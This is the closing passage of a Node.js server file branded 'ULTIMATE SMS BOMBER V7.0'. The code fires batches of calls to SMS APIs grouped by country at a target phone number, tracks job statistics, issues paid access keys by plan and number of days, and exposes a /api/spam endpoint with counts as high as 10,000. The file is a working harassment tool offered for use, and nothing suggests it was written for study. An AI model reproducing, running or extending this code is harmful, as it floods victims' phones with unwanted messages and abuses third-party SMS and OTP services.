        if (!controller.isJobActive(jobId)) break;
        const result = await callSingleAPI(api, phone, jobId);
        controller.updateJobStats(jobId, result.success, result.error);
      }
    });
    
    await Promise.all(batchPromises);
    
    if (i + BATCH_SIZE < shuffledAPIs.length) {
      await Utility.sleep(100);
    }
  }
}

// ============================================================
// PART 13: START SERVER
// ============================================================

const server = app.listen(CONFIG.server.port, CONFIG.server.host, () => {
  console.log(`\n🚀 ULTIMATE SMS BOMBER V7.0`);
  console.log(`📡 Total APIs: ${SMS_APIS.length}`);
  console.log(`📊 API Breakdown:`);
  console.log(`   🇧🇩 Bangladesh: ${BD_APIS.length}`);
  console.log(`   🇮🇳 India: ${INDIAN_APIS.length}`);
  console.log(`   🌍 International: ${INTERNATIONAL_APIS.length}`);
  console.log(`   ⚡ Generated: ${GENERATED_APIS.length}`);
  console.log(`\n✅ Server running on http://${CONFIG.server.host}:${CONFIG.server.port}`);
  console.log(`📋 Total Keys: ${keyManager.getAllKeys().length}`);
  console.log(`\n🔑 Generate Key: /api/generate-key?plan=premium&days=30`);
  console.log(`📱 Spam: /api/spam?number=017XXXXXXXX&count=10000`);
  console.log(`📊 Status: /api/status`);
});

// Graceful shutdown
process.on('SIGTERM', () => {
  console.log('🛑 SIGTERM received. Shutting down...');
  keyManager.destroy();
  server.close(() => process.exit(0));
});

process.on('SIGINT', () => {
  console.log('🛑 SIGINT received. Shutting down...');
  keyManager.destroy();
  server.close(() => process.exit(0));
});

// ============================================================
// EXPORT FOR TESTING
// ============================================================
module.exports = { app, bombController, keyManager };

// ============================================================
// END OF FILE
// ============================================================
